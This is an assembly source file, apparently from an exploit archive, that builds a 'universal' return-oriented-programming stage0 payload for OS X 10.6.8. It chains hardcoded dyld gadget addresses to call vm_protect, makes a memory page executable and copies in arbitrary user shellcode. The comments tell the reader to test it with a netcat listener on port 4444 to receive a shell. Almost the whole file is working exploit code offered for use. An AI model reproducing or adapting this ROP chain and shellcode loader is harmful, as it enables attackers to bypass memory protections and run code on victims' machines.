; universal OSX dyld ROP shellcode
; tested on OS X 10.6.8
;
; if you don't want to compile, copy stage0 code from precompiled.txt
; and append your normal shellcode to it.
;
; usage:
; - put your 'normal' shellcode in x64_shellcode.asm
; - make
; - ./sc
;
; if you want to test:
; - uncomment lea rsp, [rel rop_stage0] / ret
; - make
; - nc -l 4444
; - ./sc
; - you should get a shell over nc
;
; see my blog, if you want to know how this works:
; http://gdtr.wordpress.com
;
; greets to Jacob Hammack, for his reverse tcp shellcode (hammackj.com).
;
; pa_kt
; twitter.com/pa_kt

extern _printf

global _main

;--------------------------------------------------
;- DATA
;--------------------------------------------------
section .data

rw_area     equ 0x00007FFF5FC50000
rwx_area    equ rw_area+0x1000
vm_prot     equ 0x00007FFF5FC0D356
fake_stack  equ rw_area+0x2000
fake_frame  equ fake_stack+0x100
r12_zero    equ rw_area-0x1000

rax_off     equ rw_area-8
rbx_off     equ rw_area+8-8
rcx_off     equ rw_area+0x10-8
rdx_off     equ rw_area+0x18-8
rsi_off     equ rw_area+0x28-8
rbp_off     equ rw_area+0x30-8
rsp_off     equ rw_area+0x38-8
r8_off      equ rw_area+0x40-8
r12_off     equ rw_area+0x60-8

pop_rdi     equ 0x00007FFF5FC24CDC
pop_rbx     equ 0x00007FFF5FC23373
store_reg   equ 0x00007FFF5FC24CE1
set_regs    equ 0x00007FFF5FC24CA1

c_rwx       equ 7
c_size      equ 0x1000
c_addr      equ rwx_area
c_set_max   equ 0

dbg_ret     equ 0x00007FFF5FC24C4B

; copy shellcode to RWX area
; size = 0x1000
stub:
    lea rsi, [r15+saved_rsp_off+copy_stub_size+rop_post_size]
    xor rcx, rcx
    inc rcx
    shl rcx, 12 ;rcx = 0x1000
    lea rdi, [rel normal_shellcode]
    rep movsb
    ;int 3
normal_shellcode:

stub_size   equ $-stub

            ; order is important
rop_pre     dq  pop_rdi, rcx_off, pop_rbx, c_set_max, store_reg,
            dq  pop_rdi, rdx_off, pop_rbx, c_size, store_reg,
            dq  pop_rdi, rsi_off, pop_rbx, c_addr, store_reg,
            dq  pop_rdi, rbp_off, pop_rbx, fake_frame, store_reg,
            dq  pop_rdi, rsp_off, pop_rbx, fake_stack, store_reg,
            dq  pop_rdi, r8_off, pop_rbx, c_rwx, store_reg,
            dq  pop_rdi, r12_off, pop_rbx, r12_zero, store_reg,

            ; set fake stack
            dq  pop_rdi, fake_stack+8-8, pop_rbx, vm_prot, store_reg,

            ; set fake frame (return address -> rwx page)
            dq  pop_rdi, fake_frame-8-0x38, store_reg,
saved_rsp:
            dq  pop_rdi, fake_frame+8-8, pop_rbx, rwx_area, store_reg,

rop_pre_size    equ $-rop_pre
saved_rsp_off   equ $-saved_rsp-8

rop_post    dq  dbg_ret

            ; set all regs and jump to vm_prot
            dq  pop_rdi, rw_area, set_regs
            ; marker
            ; dq 0x1111111111111111

rop_post_size   equ $-rop_post

x64_shellcode:   incbin "x64_shellcode"
x64_shellcode_size     equ $-x64_shellcode

hello   db "test", 0
fmt     db "\x%02x",0

section .bss

rop_stage0  resq    100
copy_stub   resq    ((stub_size+7)/8)*5
copy_stub_size  equ $-copy_stub

;--------------------------------------------------
;- CODE
;--------------------------------------------------
section .text

prep_stub:

    mov     rcx, (stub_size+7)/8
    mov     rsi, stub
    mov     rdi, copy_stub
    mov     rbx, rwx_area-8
go:
    mov     rax, pop_rdi
    stosq
    mov     rax, rbx
    stosq
    mov     rax, pop_rbx
    stosq
    movsq
    mov     rax, store_reg
    stosq
    add     rbx, 8
    loop    go
    ret

make_stage0:
    mov     rsi, rop_pre
    mov     rdi, rop_stage0
    mov     rcx, rop_pre_size
    rep     movsb

    mov     rsi, copy_stub
    mov     rcx, copy_stub_size
    rep     movsb

    mov     rsi, rop_post
    mov     rcx, rop_post_size
    rep     movsb

    mov     rsi, x64_shellcode
    mov     rcx, x64_shellcode_size
    rep     movsb

    ret

print_it:
    push    rbp
    mov     rbp, rsp

    mov     rcx, rop_pre_size + copy_stub_size + rop_post_size + x64_shellcode_size
    lea     rsi, [rel rop_stage0]
    xor     rax, rax
one_char:
    lodsb
    push    rsi
    push    rcx
    mov     rsi, rax
    mov     rdi, qword fmt
    xor     rax, rax
    call    _printf
    pop     rcx
    pop     rsi
    loop    one_char

    leave
    ret

_main:
    push    qword rbp
    mov     rbp, rsp

    call    prep_stub
    call    make_stage0

    call    print_it

    ;lea     rsp, [rel rop_stage0]
    ;ret

    leave
    ret

; see http://t.co/nIrRbn5 for a detailed explanation
; full package mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17564.tgz (osx.rop.24072011.tgz)